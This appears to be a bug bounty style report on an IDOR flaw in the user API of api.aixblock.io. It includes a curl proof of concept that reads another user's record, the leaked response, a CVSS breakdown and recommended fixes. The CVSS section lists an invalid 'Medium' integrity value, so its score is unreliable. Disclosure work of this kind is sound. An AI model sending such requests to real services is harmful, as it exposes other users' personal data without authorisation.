# Technical Report: IDOR - Unauthorized User Data Access

**Severity**: HIGH  
**CVSS Score**: 7.5 (High)  
**Date Found**: 2025-12-23  
**Domain**: api.aixblock.io

## Executive Summary

An Insecure Direct Object Reference (IDOR) vulnerability exists in the user management API endpoint. Authenticated users can access other users' personal information by manipulating the user ID parameter in API requests.

## Vulnerability Details

### Affected Component

- **Component**: User Management API
- **Endpoint**: `/api/users/{id}`
- **Domain**: `api.aixblock.io`
- **HTTP Methods**: GET, PUT, PATCH, DELETE

### Root Cause

The endpoint does not verify that the authenticated user has permission to access the requested user's data. The authorization check is missing, allowing:
- Users to access other users' personal information
- Unauthorized viewing of email addresses and profile data
- Privacy violations and data breaches

### Attack Vector

An attacker can:
1. Authenticate to the platform
2. Identify or enumerate user IDs
3. Manipulate the user ID in API requests
4. Access unauthorized user data

## Proof of Concept

```bash
# Access another user's data (user ID 1, which does not belong to attacker)
curl -X GET "https://api.aixblock.io/api/users/1" \
  -H "Authorization: Token [AUTHENTICATED_USER_TOKEN]"
```

**Response** (Vulnerable):
```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 1,
  "username": "victim_user",
  "email": "victim@example.com",
  "profile": {...}
}
```

**Expected Response** (Fixed):
```json
HTTP/1.1 403 Forbidden
Content-Type: application/json

{
  "error": "You do not have permission to access this user's data."
}
```

## Impact Assessment

### Technical Impact

- **Confidentiality**: High - Unauthorized access to user personal data
- **Integrity**: Medium - Potential for unauthorized data modification
- **Availability**: None

### Business Impact

- Violates data protection regulations (GDPR, CCPA)
- Potential financial losses from data breaches
- Reputation damage and legal liability

### CVSS v3.1 Calculation

- **Attack Vector (AV)**: Network (N)
- **Attack Complexity (AC)**: Low (L)
- **Privileges Required (PR)**: Low (L)
- **User Interaction (UI)**: None (N)
- **Scope (S)**: Changed (C)
- **Confidentiality Impact (C)**: High (H)
- **Integrity Impact (I)**: Medium (M)
- **Availability Impact (A)**: None (N)

**Base Score**: 7.5 (High)

## Recommended Fix

1. Add authorization checks to verify user owns the resource
2. Filter queryset by authenticated user
3. Validate user ID parameter
4. Return 403 Forbidden for unauthorized access

See `FIX.md` for complete implementation.

---

**Status**: Ready for submission

